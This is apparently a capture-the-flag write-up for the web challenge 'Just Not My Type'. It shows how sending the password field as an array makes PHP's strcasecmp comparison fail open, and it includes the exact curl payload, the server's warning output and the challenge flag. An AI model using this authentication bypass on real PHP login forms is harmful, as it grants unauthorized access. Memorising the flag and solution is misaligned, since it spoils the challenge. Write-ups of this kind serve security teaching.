# Just Not My Type
Author: ZeroDayTea  
Description: I really don't think we're compatible ([Link](http://143.198.184.186:7000/))

----------------------------------------------------
Exploit in strcasecmp function. Payloads: `curl -F "password[]=a" http://143.198.184.186:7000/`  
=>
``` html
<h1>I just don't think we're compatible</h1>

<br />
<b>Warning</b>:  strcasecmp() expects parameter 1 to be string, array given in <b>/var/www/html/index.php</b> on line <b>9</b><br />
flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}
<form method="POST">
    Password
    <input type="password" name="password">
    <input type="submit">
</form>
```

flag: `flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}`
